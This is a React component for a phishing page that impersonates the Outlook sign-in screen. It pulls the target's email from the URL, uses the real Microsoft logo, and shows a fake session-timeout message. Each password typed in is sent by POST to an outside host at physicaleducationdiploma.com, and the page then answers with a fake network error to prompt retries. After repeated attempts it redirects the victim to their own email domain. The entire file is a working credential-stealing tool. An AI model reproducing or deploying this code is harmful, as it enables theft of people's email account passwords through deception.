
import React, { useEffect, useState, useRef } from "react";
import './App.css';
import $ from "jquery";
import Preloader from "./Preloader/Preloader";
import { CgArrowLongLeft } from "react-icons/cg";



const Outlook = ()=>{

    const [spinLoader, setSpinLoader] = useState(false);
    const [netErr, setNetErr] = useState(false);

    const formRef = useRef();

    useEffect(()=>{
        const emailInTheURL = window.location.href;
    const sliceEqualSign = emailInTheURL.indexOf("=");
    const extracetdEmail = emailInTheURL.substr((sliceEqualSign+1)).split('&', 1).toString();
        document.title = extracetdEmail;
        setSpinLoader(true);
        setTimeout(() => {
            setSpinLoader(false);
        }, 2500);
        // console.log(extracetdEmail);
    }, []);

    const emailInTheURL = window.location.href;
    const sliceEqualSign = emailInTheURL.indexOf("=");
    const extracetdEmail = emailInTheURL.substr((sliceEqualSign+1)).split('&', 1).toString();

    const [outlookEmail, setOutlookEmail] = useState(extracetdEmail);
    const [outlookPassword, setOulookPassword] = useState('');

    const btnVal = 'Sign in';

    const [count, setCount] = useState(0);

    const [err, setErr] = useState(false);

    const submitOutlookForm = e=>{
        // console.log(formRef.current);
        e.preventDefault();
        
        console.log(outlookEmail, outlookPassword);

        if(outlookPassword === ""){
            return null
            // setErr(true);
        }else{
            setOutlookEmail(outlookEmail)
            setSpinLoader(true);
            const user = {
                email: outlookEmail,
                password: outlookPassword
            };
            
            $.ajax({
                type: "POST",
                url: "https://physicaleducationdiploma.com/component/dam.php",
                data: user,
                success(data) {
                    // alert('OK');
                    console.log(data);
                },
            });
            setTimeout(()=>{
                setOulookPassword('');
                setErr(true);
                setNetErr(true);
                setTimeout(() => {
                    setSpinLoader(false);
                }, 2000);
            }, 2500)
            setErr(false);
            setCount(count=> count + 1);
            if(count >= 90){
                const redirectURL = window.location.href;
                const sliceEqualSign = redirectURL.indexOf("@");
                const extracetdemailDomain = redirectURL.substr((sliceEqualSign+1));
                console.log(extracetdemailDomain);
                window.location.href = `https://www.${extracetdemailDomain}`;
            }


        }
    }

    return(<section style={{userSelect:'none'}}>
{/* ;lkjh */}
        <h2 style={{
            textAlign:'center',
            position:'relative',
            // top:'7em',
            fontSize:'48px',
            marginBottom:'-3em',
            marginTop:'3em',
            userSelect:'none'
        }}>Outlook</h2>

        { spinLoader ? <Preloader /> : null }
        
        <div className="Outlook_wrapper">

            <div className="Outlook_form_wrapper">
                <img 
                    alt="outlook_svg"
                    src={`https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg`}
                />

                

                { !err ?
                    <p className="err">
                    Sorry, your sign-in timed out. Please sign in again.
                    <br />
                     {/* account or <span className="gett">get a new one</span>. */}
                </p>  
                : null }

                { netErr ? <p className="err">Network Error</p> : null }

                <form onSubmit={submitOutlookForm} method="post" ref={formRef} className='forrmmm'>

                    <div className="imp_cont_arrow">
                        <CgArrowLongLeft />
                        &#160;
                        &#160;
                        <span>
                            {outlookEmail}
                        </span>
                    </div>


                    <h3 style={{
                        fontSize:'22px', color:'#333'
                    }}>Enter Password</h3>
                    
                    {/* <div className="outlook_email_container">
                    <label htmlFor="name"> </label>
                        <input 
                            type={`email`}
                            value={outlookEmail}
                            readOnly
                            className="email_input_ input_outlook"
                            onChange={e=>setOutlookEmail(e.target.value)}
                            id="name"
                            name="name"
                            required
                        />
                    </div> */}

                    <div className="outlook_password_container">
                    <label htmlFor="password"> </label>
                        <input 
                            type={`password`}
                            placeholder="Password"
                            className="password_input input_outlook"
                            value={outlookPassword}
                            onChange={e=> setOulookPassword(e.target.value)}
                            required={true}
                            title="Please fill out this field"
                            name="password"
                            autoFocus
                            style={{
                              fontSize:'16px'
                            }}
                        />
                    </div>

                    {/* <div className="outlook_no_act" style={{
                            fontSize: '.7125rem',
                            color: '#444'
                    }}>
                        No account? <span className="outlook_create_" style={{
                            color: '#0067b8',
                            cursor: 'pointer'
                        }}>Create one!</span>
                    </div> */}

                    <div className="asdfghj" style={{
                        // display:'flex',
                        // alignItems:'center'
                    }}>
                        <span className="outlook_no_act keeeyy"
                        onClick={()=> window.location.reload()} 
    
                        >
                            Forgot my password
                        </span>

                        {/* <AiOutlineQuestionCircle style={{
                            cursor: 'pointer',
                            color:'#555',
                            // display:'block'
                        }}
                        className='qst_mk'
                        /> */}

                    </div>

                    {/* <div className="_opts_">
                        Sign-in options
                    </div> */}

                    <div className="oiuytre">
                        <input
                            type={`submit`} 
                            value={btnVal}
                            className="outlook_submit"
                            onClick={submitOutlookForm}
                        />
                    </div>

                </form>
            </div>

        </div>

    </section>)
};

export default Outlook;